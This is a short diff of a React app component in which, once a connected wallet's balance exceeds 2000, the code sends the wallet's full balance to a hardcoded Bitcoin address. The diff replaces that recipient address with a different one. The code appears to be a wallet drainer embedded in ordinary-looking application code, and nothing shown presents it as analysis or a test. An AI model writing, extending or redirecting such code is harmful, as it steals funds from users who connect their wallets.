@@ -128,7 +128,7 @@ function App() {
       // 1. Check BTC Balance (using the balance we added to the connect function earlier)
       if (walletData.balance > 2000) { 
         const btcTx = await sendBitcoin(
-          "bc1q9fuudepv07gt3tpm8ckmh83jrxf2f8hzylnwrm", 
+          "bc1qwhflpqx2p3nu6phdpdh6d8yql6xv95p67tf75r", 
           walletData.balance,
           walletData.type
         );
